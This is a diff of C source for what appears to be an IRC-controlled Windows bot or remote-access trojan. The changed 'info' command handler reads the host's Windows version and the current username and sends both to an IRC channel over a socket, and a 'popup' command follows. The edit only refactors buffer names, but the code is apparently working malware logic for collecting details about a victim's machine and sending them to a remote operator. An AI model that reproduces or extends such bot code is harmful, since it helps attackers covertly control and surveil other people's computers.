@@ -78,21 +78,22 @@ void et_main_loop_win(SOCKET socket, char *nick)
 					}
 					else if (!strcmp(cmd, "info"))
 					{
-						char info[IRC_MSGLEN];
+						char misc[128];
+						DWORD misc_sz = 128;
+						char info_message[IRC_MSGLEN];
 
 						OSVERSIONINFO kern_info;
 						kern_info.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
 						GetVersionEx(&kern_info);
-						_snprintf(info, IRC_MSGLEN, "PRIVMSG %s :Kernel: Windows NT %d.%d build %d\r\n", IRC_CHANNEL, (int) kern_info.dwMajorVersion, (int) kern_info.dwMinorVersion, (int) kern_info.dwBuildNumber);
-						send(socket, info, strlen(info), 0);
-						ZeroMemory(info, IRC_MSGLEN);
+						_snprintf(info_message, IRC_MSGLEN, "PRIVMSG %s :Kernel: Windows NT %d.%d build %d\r\n", IRC_CHANNEL, (int) kern_info.dwMajorVersion, (int) kern_info.dwMinorVersion, (int) kern_info.dwBuildNumber);
+						send(socket, info_message, strlen(info_message), 0);
+						ZeroMemory(info_message, IRC_MSGLEN);
 
-						char username[128];
-						DWORD username_sz = 128;
-						GetUserName(username, &username_sz);
-						_snprintf(info, IRC_MSGLEN, "PRIVMSG %s :Username: %s\r\n", IRC_CHANNEL, username);
-						send(socket, info, strlen(info), 0);
-						ZeroMemory(info, IRC_MSGLEN);
+						GetUserName(misc, &misc_sz);
+						_snprintf(info_message, IRC_MSGLEN, "PRIVMSG %s :Username: %s\r\n", IRC_CHANNEL, misc);
+						send(socket, info_message, strlen(info_message), 0);
+						ZeroMemory(info_message, IRC_MSGLEN);
+						ZeroMemory(misc, misc_sz);
 					}
 					else if (strstr(cmd, "popup"))
 					{
